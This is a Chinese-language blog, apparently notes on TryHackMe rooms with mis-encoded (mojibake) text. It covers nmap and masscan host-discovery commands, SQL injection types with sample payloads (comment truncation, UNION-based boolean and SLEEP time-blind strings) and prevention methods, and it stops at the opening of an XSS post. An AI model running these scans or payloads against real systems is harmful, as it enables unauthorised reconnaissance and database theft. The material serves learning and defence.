<p>ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œè¿è¡Œ<code>sudo nmap -PA -sn MACHINE_IP/24</code>ä»¥å‘ç°åœ¨çº¿çš„ä¸»æœºã€‚</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo nmap -PA -sn 10.10.68.220/24</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 13:46 EEST</span><br><span class="line">Nmap scan report for 10.10.68.52</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.121</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Nmap scan report for 10.10.68.125</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Nmap scan report for 10.10.68.134</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Nmap scan report for 10.10.68.220</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 29.89 seconds</span><br></pre></td></tr></tbody></table></figure>
<h3 id="udp-ping"><strong>UDP Ping</strong></h3>
<p>ä¸ TCP SYN ping ç›¸åï¼Œå°† UDP
æ•°æ®åŒ…å‘é€åˆ°å¼€æ”¾ç«¯å£ä¸ä¼šæœ‰ä»»ä½•ç­”å¤ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å‘ä¸€ä¸ªå…³é—­çš„ UDP
ç«¯å£å‘é€ä¸€ä¸ª UDP æ•°æ®åŒ…ï¼Œæˆ‘ä»¬å¸Œæœ›å¾—åˆ°ä¸€ä¸ª ICMP
ç«¯å£æ— æ³•è®¿é—®çš„æ•°æ®åŒ…ï¼›è¿™è¡¨æ˜ç›®æ ‡ç³»ç»Ÿå·²ç»å¯åŠ¨å¹¶å¯ç”¨ã€‚Nmap
ä½¿ç”¨<code>-PU</code>æ¥è¿›è¡Œ UDP ping ã€‚</p>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/1b827ef60c39619e281c4ca51a6d57b6.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c8b2d403667487322058619e561186d2.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<h3 id="masscan"><strong>Masscan</strong></h3>
<p>å¦å¤–ï¼ŒMasscan
ä½¿ç”¨ç±»ä¼¼çš„æ–¹æ³•æ¥å‘ç°å¯ç”¨çš„ç³»ç»Ÿã€‚ç„¶è€Œï¼Œä¸ºäº†å¿«é€Ÿå®Œæˆç½‘ç»œæ‰«æï¼ŒMasscan
åœ¨æ•°æ®åŒ…ç”Ÿæˆé€Ÿåº¦æ–¹é¢éå¸¸ç§¯æã€‚è¯­æ³•ä¸ Nmap éå¸¸ç›¸ä¼¼ï¼š<code>-p</code>
åé¢å¯ä»¥è·Ÿä¸€ä¸ªç«¯å£å·ã€åˆ—è¡¨æˆ–èŒƒå›´ã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li><code>masscan MACHINE_IP/24 -p443</code></li>
<li><code>masscan MACHINE_IP/24 -p80,443</code></li>
<li><code>masscan MACHINE_IP/24 -p22-25</code></li>
<li><code>masscan MACHINE_IP/24 â€â€top-ports 100</code></li>
</ul>
<h2 id="using-reverse-dns-lookupåå‘dnsæŸ¥æ‰¾">Using Reverse-DNS
Lookupï¼ˆåå‘DNSæŸ¥æ‰¾ï¼‰</h2>
<p>Nmap çš„é»˜è®¤è¡Œä¸ºæ˜¯ä½¿ç”¨åå‘ DNS
æŸ¥æ‰¾åœ¨çº¿ä¸»æœºã€‚å› ä¸ºä¸»æœºåå¯ä»¥æ­ç¤ºå¾ˆå¤šä¸œè¥¿ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªæœ‰ç”¨çš„æ­¥éª¤ã€‚ä½†æ˜¯ï¼Œå¦‚æœä¸å¸Œæœ›å‘é€æ­¤ç±»
DNS æŸ¥è¯¢ï¼Œå¯ä»¥ä½¿ç”¨ <code>-n</code> è·³è¿‡æ­¤æ­¥éª¤ã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒNmap å°†æŸ¥æ‰¾åœ¨çº¿ä¸»æœºï¼›ä½†æ˜¯ï¼Œä½ å¯ä»¥ä½¿ç”¨é€‰é¡¹ <code>-R</code>
æ¥æŸ¥è¯¢ DNS æœåŠ¡å™¨ï¼Œå³ä½¿æ˜¯é’ˆå¯¹è„±æœºä¸»æœºã€‚å¦‚æœè¦ä½¿ç”¨ç‰¹å®šçš„ DNS
æœåŠ¡å™¨ï¼Œå¯ä»¥æ·»åŠ <code>--dns-servers DNS_SERVER</code>é€‰é¡¹ã€‚</p>
<h2 id="æ€»ç»“">æ€»ç»“</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">Scan Type</th>
<th style="text-align: center;">Example Command</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">ARP Scan</td>
<td style="text-align: center;"><code>sudo nmap -PR -sn MACHINE_IP/24</code></td>
</tr>
<tr class="even">
<td style="text-align: center;">ICMP Echo Scan</td>
<td style="text-align: center;"><code>sudo nmap -PE -sn MACHINE_IP/24</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;">ICMP Timestamp Scan</td>
<td style="text-align: center;"><code>sudo nmap -PP -sn MACHINE_IP/24</code></td>
</tr>
<tr class="even">
<td style="text-align: center;">ICMP Address Mask Scan</td>
<td style="text-align: center;"><code>sudo nmap -PM -sn MACHINE_IP/24</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;">TCP SYN Ping Scan</td>
<td style="text-align: center;"><code>sudo nmap -PS22,80,443 -sn MACHINE_IP/30</code></td>
</tr>
<tr class="even">
<td style="text-align: center;">TCP ACK Ping Scan</td>
<td style="text-align: center;"><code>sudo nmap -PA22,80,443 -sn MACHINE_IP/30</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;">UDP Ping Scan</td>
<td style="text-align: center;"><code>sudo nmap -PU53,161,162 -sn MACHINE_IP/30</code></td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">Option</th>
<th style="text-align: center;">Purpose</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>-n</code></td>
<td style="text-align: center;">no DNS lookup</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>-R</code></td>
<td style="text-align: center;">reverse-DNS lookup for all hosts</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>-sn</code></td>
<td style="text-align: center;">host discovery only</td>
</tr>
</tbody>
</table>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/28/SQL%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQLæ³¨å…¥ï¼ˆSQLiï¼‰</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-02-28 14:30:13" itemprop="dateCreated datePublished" datetime="2023-02-28T14:30:13+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-06-10 15:53:49" itemprop="dateModified" datetime="2023-06-10T15:53:49+08:00">2023-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>2.4k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>2 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMeå®éªŒæˆ¿é—´ï¼šhttps://tryhackme.com/room/sqlinjectionlm</p>
<h2 id="introduction">Introduction</h2>
<p>ä½¿ç”¨ SQL çš„webåº”ç”¨ç¨‹åºå¯ä»¥è½¬å˜ä¸º SQL
æ³¨å…¥çš„å…³é”®ç‚¹åœ¨äºç”¨æˆ·æä¾›çš„æ•°æ®è¢«åŒ…å«åœ¨ SQL æŸ¥è¯¢ä¸­ã€‚</p>
<p>å‡è®¾ï¼Œä½ é‡åˆ°äº†ä¸€ä¸ªåœ¨çº¿åšå®¢ï¼Œæ¯ä¸ªåšå®¢æ¡ç›®éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ id
å·ï¼Œåšå®¢æ¡ç›®å¯ä»¥è®¾ç½®ä¸ºå…¬å…±æˆ–ç§æœ‰ï¼Œè¿™å–å†³äºå®ƒä»¬æ˜¯å¦å·²ç»å‡†å¤‡å¥½å…¬å¼€å‘å¸ƒï¼Œåšå®¢æ¡ç›®çš„
URL å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><code>https://website.thm/blog?id=1</code></p>
<p>ä»ä¸Šé¢çš„ URL ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°æ‰€é€‰çš„åšå®¢æ¡ç›®æ¥è‡ªæŸ¥è¯¢å­—ç¬¦ä¸²(query
string)ä¸­çš„ id
å‚æ•°ã€‚Webåº”ç”¨ç¨‹åºéœ€è¦ä»æ•°æ®åº“ä¸­æ£€ç´¢æ–‡ç« ï¼Œå¹¶ä½¿ç”¨å¦‚ä¸‹çš„SQLè¯­å¥ï¼š</p>
<p><code>SELECT * from blog where id=1 and private=0 LIMIT 1;</code></p>
<p>å‘ç°ä¸Šé¢çš„SQLè¯­å¥æ­£åœ¨åšå®¢è¡¨ä¸­æŸ¥æ‰¾ id å·ä¸º 1
ä¸”<code>private</code>åˆ—è®¾ç½®ä¸º 0
çš„æ–‡ç« ï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥è¢«å…¬ä¼—æŸ¥çœ‹ï¼Œå¹¶ä¸”ä½¿ç”¨äº†<code>limit</code>å°†ç»“æœé™åˆ¶ä¸ºåªæœ‰ä¸€ä¸ªåŒ¹é…é¡¹ã€‚</p>
<p>æ­£å¦‚åœ¨æœ¬æ–‡å¼€å¤´æ‰€æåˆ°çš„ï¼Œå½“ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¢«å¼•å…¥æ•°æ®åº“æŸ¥è¯¢æ—¶ï¼Œå°±ä¼šå¼•å…¥SQLæ³¨å…¥ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²ä¸­çš„
id å‚æ•°ç›´æ¥ç”¨äº SQL æŸ¥è¯¢ã€‚</p>
<p>å‡è®¾æ–‡ç«  id 2
ä»ç„¶é”å®šä¸ºç§æœ‰çš„ï¼Œæ‰€ä»¥å®ƒä¸èƒ½åœ¨ç½‘ç«™ä¸ŠæŸ¥çœ‹ã€‚æˆ‘ä»¬ç°åœ¨å¯ä»¥å°† URL æ”¹ä¸ºï¼š</p>
<p><code>https://website.thm/blog?id=2;--</code></p>
<p>å¯¹åº”ç”Ÿæˆçš„ SQL è¯­å¥ä¸ºï¼š</p>
<p><code>SELECT * from blog where id=2;-- and private=0 LIMIT 1;</code></p>
<p>URL ä¸­çš„åˆ†å·è¡¨ç¤º SQL
è¯­å¥çš„ç»“æŸï¼Œä¸¤ä¸ªæ¨ªæ (<code>--</code>)ä¼šå¯¼è‡´ä¹‹åçš„æ‰€æœ‰å†…å®¹éƒ½è¢«è§†ä¸ºæ³¨é‡Šã€‚é€šè¿‡è¿™æ ·åšï¼Œå®é™…ä¸Šæ˜¯åœ¨è¿è¡ŒæŸ¥è¯¢ï¼š</p>
<p><code>SELECT * from blog where id=2;--</code></p>
<p>æ— è®ºæ˜¯å¦å°†å…¶è®¾ç½®ä¸ºå…¬å¼€ï¼Œå®ƒå°†è¿”å› id ä¸º 2 çš„æ–‡ç« ã€‚</p>
<h2 id="åˆ†ç±»">åˆ†ç±»</h2>
<h3 id="in-band-sqli">In-Band SQLi</h3>
<p>In-Band SQL æ³¨å…¥æ˜¯æœ€å®¹æ˜“æ£€æµ‹å’Œåˆ©ç”¨çš„ç±»å‹ã€‚In-Band
æ˜¯æŒ‡ä½¿ç”¨ç›¸åŒé€šä¿¡æ–¹æ³•æ¥åˆ©ç”¨æ¼æ´å¹¶æ¥å—ç»“æœã€‚ä¾‹å¦‚ï¼Œåœ¨ç½‘é¡µä¸Šå‘ç° SQL
æ³¨å…¥æ¼æ´ï¼Œç„¶åèƒ½å¤Ÿä»æ•°æ®åº“ä¸­å°†æ•°æ®æå–åˆ°åŒä¸€é¡µé¢ã€‚</p>
<ul>
<li><p><strong>Error-Based SQL Injection</strong>(åŸºäºæŠ¥é”™çš„SQLæ³¨å…¥)</p>
<p>è¿™ç§ç±»å‹çš„ SQL
æ³¨å…¥å¯¹äºè½»æ¾è·å–æœ‰å…³æ•°æ®åº“ç»“æ„çš„ä¿¡æ¯æ˜¯æœ€æœ‰ç”¨çš„ï¼Œå› ä¸ºæ¥è‡ªæ•°æ®åº“çš„é”™è¯¯ä¿¡æ¯ä¼šç›´æ¥æ‰“å°åˆ°ç½‘é¡µä¸Šï¼Œè¿™é€šå¸¸å¯ä»¥ç”¨äºæšä¸¾æ•´ä¸ªæ•°æ®åº“ã€‚</p></li>
<li><p><strong>Union-Based SQL Injection</strong>(åŸºäº union
çš„SQLæ³¨å…¥)</p>
<p>è¿™ç§ç±»å‹çš„æ³¨å…¥ä½¿ç”¨ UNION æ“ä½œç¬¦å’Œ SELECT
è¯­å¥ä¸€èµ·å‘é¡µé¢è¿”å›å…¶ä»–ç»“æœã€‚è¿™æ˜¯é€šè¿‡SQLæ³¨å…¥æ¼æ´æå–å¤§é‡æ•°æ®çš„æœ€å¸¸è§æ–¹æ³•ã€‚</p></li>
</ul>
<h3 id="blind-sqli">Blind SQLi</h3>
<p>ä¸ in-band SQL æ³¨å…¥ä¸åŒï¼Œblind SQL
æ³¨å…¥å‡ ä¹æ²¡æœ‰åé¦ˆæ¥æç¤ºæˆ‘ä»¬æˆ‘ä»¬æ˜¯å¦æ³¨å…¥æˆåŠŸï¼Œè¿™æ˜¯å› ä¸ºé”™è¯¯æ¶ˆæ¯å·²è¢«ç¦ç”¨ï¼Œä½†æ— è®ºå¦‚ä½•ï¼Œæ³¨å…¥ä¾æ—§æ˜¯æœ‰æ•ˆçš„ã€‚</p>
<ul>
<li><p>Authentication Bypass(èº«ä»½éªŒè¯ç»•è¿‡)</p>
<p>æœ€ç›´æ¥çš„ blind SQLi
æŠ€å·§ä¹‹ä¸€å°±æ˜¯ç»•è¿‡ç™»å½•è¡¨å•ç­‰èº«ä»½éªŒè¯ã€‚è¿æ¥åˆ°ç”¨æˆ·æ•°æ®åº“çš„ç™»å½•è¡¨å•é€šå¸¸ä»¥è¿™æ ·çš„æ–¹å¼å¼€å‘ï¼Œå³ï¼šwebåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·åå’Œå¯†ç çš„å†…å®¹ä¸æ„Ÿå…´è¶£ï¼Œè€Œç­‰å…³æ³¨ä¸¤è€…æ˜¯å¦åœ¨ç”¨æˆ·è¡¨ä¸­åŒ¹é…ã€‚åŸºæœ¬ä¸Šï¼Œwebåº”ç”¨ç¨‹åºä¼šè¯¢é—®æ•°æ®åº“â€œæ‚¨æ˜¯å¦æ˜¯ç”¨æˆ·åä¸º
<strong>bob</strong> ã€å¯†ç ä¸º <strong>bob123</strong>
çš„ç”¨æˆ·ï¼Ÿâ€ï¼Œæ•°æ®åº“ä¼šå›ç­”â€œæ˜¯â€æˆ–â€œå¦â€ï¼Œå¹¶æ ¹æ®å›ç­”å†³å®šwebåº”ç”¨ç¨‹åºæ˜¯å¦å…è®¸ä½ ç»§ç»­æ“ä½œã€‚</p></li>
<li><p><strong>Boolean Based</strong>(å¸ƒå°”ç›²æ³¨)</p>
<p>å¸ƒå°”ç›²æ³¨æ˜¯æŒ‡æˆ‘ä»¬ä»æ³¨å…¥å°è¯•ä¸­æ”¶åˆ°çš„å¯èƒ½æ˜¯<code>true/false</code>ã€<code>yes/no</code>ã€<code>on/off</code>ã€<code>1/0</code>æˆ–è€…ä»»ä½•åªèƒ½æœ‰ä¸¤ä¸ªç»“æœçš„å“åº”ã€‚è¯¥ç»“æœè¡¨æ˜æ”»å‡»è€…çš„
SQL
æ³¨å…¥æ˜¯å¦æˆåŠŸã€‚è™½ç„¶å“åº”åªæœ‰ä¸¤ç§ç»“æœï¼Œä½†è¿˜æ˜¯èƒ½å¤Ÿæšä¸¾æ•´ä¸ªæ•°æ®åº“çš„ç»“æ„å’Œå†…å®¹ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡å¸ƒå°”ç›²æ³¨æ¥åˆ¤æ–­æ•°æ®åº“çš„é¦–å­—æ¯(<code>admin123' UNION SELECT 1,2,3 where database() like 's%';--</code>)ã€‚</p></li>
<li><p><strong>Time Based</strong>(æ—¶é—´ç›²æ³¨)</p>
<p>æ—¶é—´ç›²æ³¨ä¸ä¸Šè¿°çš„å¸ƒå°”ç›²æ³¨éå¸¸ç›¸ä¼¼ï¼Œå› ä¸ºå‘é€ç›¸åŒçš„è¯·æ±‚ï¼Œä½†æ²¡æœ‰ç›´è§‚çš„æŒ‡ç¤ºæ‚¨çš„æŸ¥è¯¢æ˜¯é”™è¯¯çš„è¿˜æ˜¯æ­£ç¡®çš„ã€‚ç›¸åï¼Œæ­£ç¡®æŸ¥è¯¢çš„æŒ‡æ ‡æ˜¯åŸºäºå®ŒæˆæŸ¥è¯¢æ‰€éœ€çš„æ—¶é—´ã€‚è¿™ç§æ—¶é—´å»¶è¿Ÿæ˜¯é€šè¿‡åœ¨
UNION è¯­å¥æ—è¾¹ä½¿ç”¨å†…ç½®æ–¹æ³•ï¼ˆå¦‚
<strong>SLEEP(x)</strong>ï¼‰å¼•å…¥çš„ã€‚SLEEP() æ–¹æ³•åªèƒ½åœ¨ UNION SELECT
è¯­å¥æˆåŠŸæ—¶æ‰§è¡Œã€‚</p>
<p>ä¾‹å¦‚ï¼Œå½“è¯•å›¾ç¡®å®šè¡¨ä¸­çš„åˆ—æ•°æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢ï¼š</p>
<p><code>admin123' UNION SELECT SLEEP(5)</code></p>
<p>å¦‚æœæœªäº§ç”Ÿåœé¡¿ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºè¯¥è¯·æ±‚æœªæˆåŠŸï¼Œæ‰€ä»¥æˆ‘ä»¬å¢åŠ ä¸€åˆ—ï¼š</p>
<p><code>admin123' UNION SELECT SLEEP(5),2;--</code></p>
<p>ç›´åˆ°äº§ç”Ÿ 5 ç§’å»¶è¿Ÿä¸ºæ­¢ã€‚</p></li>
</ul>
<h3 id="out-of-band-sqli">Out of Band SQLi</h3>
<p>æ­¤ç±» SQL
æ³¨å…¥å¹¶ä¸å¸¸è§ï¼Œå› ä¸ºå®ƒè¦ä¹ˆå–å†³äºæ•°æ®åº“æœåŠ¡å™¨ä¸Šå¯ç”¨çš„ç‰¹å®šåŠŸèƒ½ï¼Œè¦ä¹ˆå–å†³äºwebåº”ç”¨ç¨‹åºçš„ä¸šåŠ¡é€»è¾‘ï¼Œåè€…æ ¹æ®SQLæŸ¥è¯¢çš„ç»“æœè¿›è¡ŒæŸç§å¤–éƒ¨ç½‘ç»œè°ƒç”¨ã€‚</p>
<p>Out-Of-Band
æ”»å‡»é€šè¿‡ä¸¤ä¸ªä¸åŒçš„é€šä¿¡æ¸ é“è¿›è¡Œåˆ†ç±»ï¼Œä¸€ä¸ªç”¨äºå‘èµ·æ”»å‡»ï¼Œå¦ä¸€ä¸ªç”¨äºæ”¶é›†ç»“æœã€‚ä¾‹å¦‚ï¼Œæ”»å‡»é€šé“å¯ä»¥æ˜¯webè¯·æ±‚ï¼Œæ•°æ®æ”¶é›†é€šé“å¯ä»¥ç›‘è§†å¯¹ä½ æ§åˆ¶çš„æœåŠ¡å‘å‡ºçš„HTTP/DNSè¯·æ±‚ã€‚</p>
<p>1ï¼‰ æ”»å‡»è€…é€šè¿‡æ³¨å…¥ payload å‘æ˜“å—æ”»å‡»çš„ç½‘ç«™å‘å‡ºè¯·æ±‚ã€‚</p>
<p>2ï¼‰ è¯¥ç½‘ç«™å¯¹æ•°æ®åº“è¿›è¡ŒSQLæŸ¥è¯¢ï¼Œå¹¶ä¼ é€’é»‘å®¢çš„ payload ã€‚</p>
<p>3ï¼‰ payload
åŒ…å«ä¸€ä¸ªè¯·æ±‚ï¼Œè¯¥è¯·æ±‚å¼ºåˆ¶å°†åŒ…å«æ•°æ®åº“æ•°æ®çš„HTTPè¯·æ±‚è¿”å›ç»™é»‘å®¢çš„è®¡ç®—æœºã€‚</p>
<h2 id="é¢„é˜²æªæ–½">é¢„é˜²æªæ–½</h2>
<h3 id="é¢„ç¼–è¯‘è¯­å¥å‚æ•°åŒ–æŸ¥è¯¢">é¢„ç¼–è¯‘è¯­å¥ï¼ˆå‚æ•°åŒ–æŸ¥è¯¢ï¼‰</h3>
<p>å¼€å‘äººå‘˜é¦–å…ˆç¼–å†™ SQL
æŸ¥è¯¢ï¼Œç„¶åå°†ä»»ä½•ç”¨æˆ·è¾“å…¥ä½œä¸ºå‚æ•°æ·»åŠ ã€‚ç¼–å†™å‡†å¤‡å¥½çš„è¯­å¥å¯ä»¥ç¡®ä¿ SQL
ä»£ç ç»“æ„ä¸å˜ï¼Œå¹¶ä¸”æ•°æ®åº“å¯ä»¥åŒºåˆ†æŸ¥è¯¢å’Œæ•°æ®ã€‚ä½œä¸ºä¸€ä¸ªå¥½å¤„ï¼Œå®ƒè¿˜ä½¿æ‚¨çš„ä»£ç çœ‹èµ·æ¥æ›´å¹²å‡€ã€æ›´å®¹æ˜“é˜…è¯»ã€‚</p>
<h3 id="å¯¹è¾“å…¥è¿›è¡ŒéªŒè¯">å¯¹è¾“å…¥è¿›è¡ŒéªŒè¯</h3>
<p>è¾“å…¥éªŒè¯å¯ä»¥åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šä¿æŠ¤è¾“å…¥åˆ° SQL
æŸ¥è¯¢ä¸­çš„å†…å®¹ã€‚ä½¿ç”¨å…è®¸åˆ—è¡¨å¯ä»¥å°†è¾“å…¥é™åˆ¶ä¸ºä»…æŸäº›å­—ç¬¦ä¸²ï¼Œæˆ–è€…ç¼–ç¨‹è¯­è¨€ä¸­çš„å­—ç¬¦ä¸²æ›¿æ¢æ–¹æ³•å¯ä»¥è¿‡æ»¤ä½ å¸Œæœ›å…è®¸æˆ–ä¸å…è®¸çš„å­—ç¬¦ã€‚</p>
<h3 id="å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè½¬ä¹‰">å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè½¬ä¹‰</h3>
<p>å…è®¸ç”¨æˆ·è¾“å…¥åŒ…å«è¯¸å¦‚<code>'</code>ã€<code>"</code>ã€<code>$</code>ã€<code>\</code>ä¹‹ç±»çš„å­—ç¬¦å¯èƒ½ä¼šå¯¼è‡´SQLæŸ¥è¯¢ä¸­æ–­ï¼Œæˆ–è€…æ›´ç³Ÿçš„æ˜¯ï¼Œæ­£å¦‚æˆ‘ä»¬æ‰€äº†è§£çš„é‚£æ ·ï¼Œæ‰“å¼€å®ƒä»¬ä»¥æ¥å—æ³¨å…¥æ”»å‡»ã€‚è½¬ä¹‰ç”¨æˆ·è¾“å…¥æ˜¯åœ¨è¿™äº›å­—ç¬¦å‰é¢åŠ ä¸Šåæ–œæ ï¼ˆï¼‰çš„æ–¹æ³•ï¼Œè¿™æ ·ä¼šå¯¼è‡´å®ƒä»¬è¢«è§£æä¸ºå¸¸è§„å­—ç¬¦ä¸²è€Œä¸æ˜¯ç‰¹æ®Šå­—ç¬¦ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/28/XSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/XSS/" class="post-title-link" itemprop="url">XSS</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-02-28 14:30:13" itemprop="dateCreated datePublished" datetime="2023-02-28T14:30:13+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-06-10 15:53:29" itemprop="dateModified" datetime="2023-06-10T15:53:29+08:00">2023-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>7.2k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>7 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMeå®éªŒæˆ¿é—´ï¼šhttps://tryhackme.com/room/xssgi</p>
<h2 id="introduction">Introduction</h2>
<p><strong>XSS</strong> å³è·¨ç«™è„šæœ¬æ”»å‡»(Cross-Site
Scripting)æ˜¯ä¸€ç§æ³¨å…¥æ”»å‡»ï¼Œå°†æ¶æ„çš„ JavaScript
è¯­å¥æ³¨å…¥åˆ°webåº”ç”¨ç¨‹åºä¸­ï¼Œä½¿å¾—å…¶ä»–ç”¨æˆ·æ‰§è¡Œè¯¥æ¶æ„ä»£ç ã€‚</p>
<h2 id="xss-payloads">XSS Payloads</h2>
<p>åœ¨ XSS ä¸­ï¼Œpayload æ˜¯æˆ‘ä»¬å¸Œæœ›æ‰§è¡Œåœ¨ç›®æ ‡è®¡ç®—æœºä¸Šçš„ JavaScript
ä»£ç ã€‚Payload åŒ…å«ä¸¤éƒ¨åˆ†ï¼šintention å’Œ modificationã€‚</p>
<p>Intention å°±æ˜¯ä½ å¸Œæœ› JavaScript ä»£ç æ‰§è¡Œçš„æ“ä½œï¼Œè€Œ modification
åˆ™æ˜¯æˆ‘ä»¬éœ€è¦åŸºäºä¸åŒæƒ…å†µå¯¹ä»£ç çš„æ›´æ”¹ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„ XSS intentionã€‚</p>
<h3 id="proof-of-conceptæ¦‚å¿µéªŒè¯">Proof Of Conceptï¼ˆæ¦‚å¿µéªŒè¯ï¼‰</h3>
